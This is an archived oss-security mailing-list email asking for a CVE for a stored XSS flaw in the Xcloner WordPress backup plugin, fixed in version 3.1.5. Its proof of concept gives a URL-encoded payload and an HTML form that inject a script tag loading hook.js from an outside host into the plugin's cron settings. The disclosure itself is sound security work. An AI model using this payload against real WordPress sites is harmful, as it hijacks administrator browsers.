X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1042" "Wednesday" "27" "July" "2016" "02:35:46" "+0000" "limingxing" "limingxing@360.cn" "<3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>" "42" "[oss-security] CVE request : a stored XSS in Xcloner for wordpress" nil nil nil "7" "2016072702:35:46" "[oss-security] CVE request : a stored XSS in Xcloner for wordpress" (number mark "U       limingxing@3 Jul 27   42/1042  " thread-indent "\"[oss-security] CVE request : a stored XSS in Xcloner for wordpress\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30010 invoked by uid 550); 27 Jul 2016 12:19:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24059 invoked from network); 27 Jul 2016 02:36:01 -0000
From: limingxing <limingxing@360.cn>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE request : a stored XSS in Xcloner for wordpress
Thread-Index: AdHnr3yPMg9GdCCERk2v+k0+QrUMDg==
Date: Wed, 27 Jul 2016 02:35:46 +0000
Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>
Accept-Language: zh-CN, en-US
Content-Language: zh-CN
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-originating-ip: [10.199.1.156]
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
Subject: [oss-security] CVE request : a stored XSS in Xcloner for wordpress

Hi

     I found a stored XSS in Xcloner for wordpress.  The XSS filter can=20
be bypass.

     Here is the plugin page
     https://wordpress.org/plugins/xcloner-backup-and-restore/

     PoC

     In the "Corn setting" page(URL is=20
"http://<target>/wordpress/wp-admin/plugins.php?page=3Dxcloner_show&option=
=3Dcom_cloner&task=3Dconfig"),=20
set the "Backup name" (corn_bname) like=20
"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on"

     <html>
         <form=20
action=3D"http://<target>/wordpress/wp-admin/plugins.php?page=3Dxcloner_sho=
w&option=3Dcom_cloner&task=3Dconfig"=20
method=3D"post">
             <input type=3D"hidden" name=3D"cron_bname"=20
value=3D"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.j=
s+on"=20
/>
             <input type=3D"submit" name=3D"submit">
         </form>
     </html>


     Fix way
     Update to version 3.1.5

     Change

     https://plugins.trac.wordpress.org/changeset/1456784


     Could you assign a CVE ID for it?

Chen Ruiqi
Codesafe Team=
